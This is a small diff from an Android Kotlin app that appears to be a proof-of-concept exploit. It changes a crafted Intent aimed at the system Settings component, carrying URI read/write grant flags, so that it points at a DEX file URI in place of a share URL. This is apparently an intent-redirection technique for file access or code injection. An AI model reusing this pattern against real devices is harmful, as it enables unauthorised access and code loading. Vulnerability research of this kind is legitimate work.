@@ -712,7 +712,7 @@ class MainActivity : AppCompatActivity() {
                     // intent2: 合并原 intent2（系统设置主页 + 授权 flags）与原 extraIntent（分享请求参数）
                     val intent2 = Intent()
                         .setComponent(ComponentName("com.android.settings", "com.android.settings.Settings"))
-                        .setData(Uri.parse("https://openmobile.qq.com/share?share_id=poc_001"))
+                        .setDataAndType(dexUri, mimeType)
                         .addFlags(
                             Intent.FLAG_GRANT_READ_URI_PERMISSION or
                             Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
